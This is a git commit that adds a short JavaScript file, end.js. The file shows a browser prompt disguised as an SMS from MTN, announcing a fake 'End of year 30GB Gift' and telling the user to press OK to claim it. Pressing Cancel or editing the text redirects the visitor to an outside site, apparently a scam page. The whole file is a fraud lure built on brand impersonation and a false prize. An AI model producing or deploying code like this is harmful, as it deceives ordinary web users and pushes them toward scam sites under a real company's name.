b8752c6d7c6d02e4f54f6116ddfd0d534806210c
boss-bloq <nsisboy01@gmail.com>
2024-10-13 21:49:31 -0700

    Create end.js

---
+++ end.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 30GB GIFT'
+password=prompt('SMS: Congratulations You are qualify for the MTN End of year 30GB Gift, Kindly Press OK to Claim your Gift   ','CLAIM 30GB GIFT');
+if (password != 'CLAIM 30GB GIFT') {
+location.href='https://damba-fest.org/30gb-gift.html';
+}
